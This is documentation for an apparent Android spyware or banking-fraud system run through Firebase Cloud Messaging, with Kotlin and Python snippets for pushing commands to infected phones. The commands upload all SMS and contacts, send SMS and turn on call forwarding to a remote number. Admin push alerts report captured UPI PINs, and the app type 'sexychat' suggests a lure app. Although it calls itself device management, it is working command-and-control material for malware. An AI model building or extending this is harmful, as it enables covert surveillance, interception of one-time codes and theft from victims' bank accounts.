# Firebase

Complete guide for Firebase integration (devices + admins).

## Two Firebase Projects

1. **Device Firebase** - Send commands to devices
2. **Admin Firebase** - Push notifications to admins

## Device Firebase Setup

### 1. Create Project
1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Create new project: "Device Management"
3. Add Android app
4. Download `google-services.json`

### 2. Get Service Account
1. Project Settings → Service Accounts
2. Generate new private key
3. Save as `device-firebase-adminsdk.json`
4. Place in project root

### 3. Android Implementation

**Add to `build.gradle`:**
```gradle
dependencies {
    implementation platform('com.google.firebase:firebase-bom:32.7.0')
    implementation 'com.google.firebase:firebase-messaging'
}
```

**Subscribe to Topic:**
```kotlin
FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
    .addOnCompleteListener { task ->
        Log.d("FCM", if (task.isSuccessful) "Subscribed" else "Failed")
    }
```

**Handle Messages:**
```kotlin
override fun onMessageReceived(message: RemoteMessage) {
    val type = message.data["type"]
    when (type) {
        "ping" -> sendPingResponse()
        "get_sms" -> uploadSMS()
        "start_services" -> startAllServices()
        "restart_heartbeat" -> restartHeartbeat()
    }
}
```

## Admin Firebase Setup

Same process, different project:
1. Create "Admin Notifications" project
2. Download `admin-firebase-adminsdk.json`
3. Mobile app integrates for push notifications

## Firebase Commands

### Individual Commands

```python
from app.services.firebase_service import firebase_service

await firebase_service.send_command_to_device(
    fcm_token="device_token",
    command_type="ping"
)
```

### Topic Messaging (Broadcast)

```python
await firebase_service.restart_all_heartbeats()
await firebase_service.ping_all_devices_topic()
await firebase_service.start_all_services()
```

### Available Commands

| Command | Description | Parameters |
|---------|-------------|------------|
| `ping` | Test connectivity | None |
| `send_sms` | Send SMS | phoneNumber, message |
| `call_forwarding` | Enable/disable | action: enable/disable, number |
| `quick_upload_sms` | Upload recent SMS | None |
| `quick_upload_contacts` | Upload contacts | None |
| `upload_all_sms` | Upload all SMS | None |
| `upload_all_contacts` | Upload all contacts | None |
| `start_services` | Start all services | None |
| `restart_heartbeat` | Restart heartbeat | None |

## Call Forwarding

### Enable Call Forwarding

```python
await firebase_service.enable_call_forwarding(
    fcm_token="device_token",
    forwarding_number="+989123456789"
)
```

### Disable Call Forwarding

```python
await firebase_service.disable_call_forwarding(
    fcm_token="device_token"
)
```

### Result Callback

Device sends result to:
```
POST /api/call-forwarding/result
{
  "deviceId": "abc123",
  "action": "enable",
  "success": true,
  "result": "*21*+989123456789#",
  "forwardingNumber": "+989123456789"
}
```

## Topic Messaging

### Benefits
- 1 request for all devices
- Zero server load
- Firebase handles distribution
- Scales infinitely

### Implementation

**Device side:**
```kotlin
FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
```

**Server side:**
```python
await firebase_service.send_to_topic(
    topic="all_devices",
    command_type="restart_heartbeat"
)
```

### Background Task

Automatic task runs every 10 minutes:
```python
await firebase_service.restart_all_heartbeats()
```

## Admin Push Notifications

### Device Registration

```python
await firebase_admin_service.notify_device_registration(
    admin_username="admin",
    device_id="abc123",
    device_model="Samsung S21",
    app_type="sexychat"
)
```

### UPI Detection

```python
await firebase_admin_service.notify_upi_detected(
    admin_username="admin",
    device_id="abc123",
    upi_pin="123456"
)
```

## Troubleshooting

### Messages Not Received
- Check FCM token validity
- Verify service account JSON files
- Ensure app has background permissions
- Check Firebase console for errors

### Token Expired
- Device must refresh token
- Send new token to server
- Server updates database

## Security

- Never commit Firebase JSON files
- Restrict Firebase rules
- Use environment variables
- Monitor usage in console

**Last Updated**: November 10, 2025
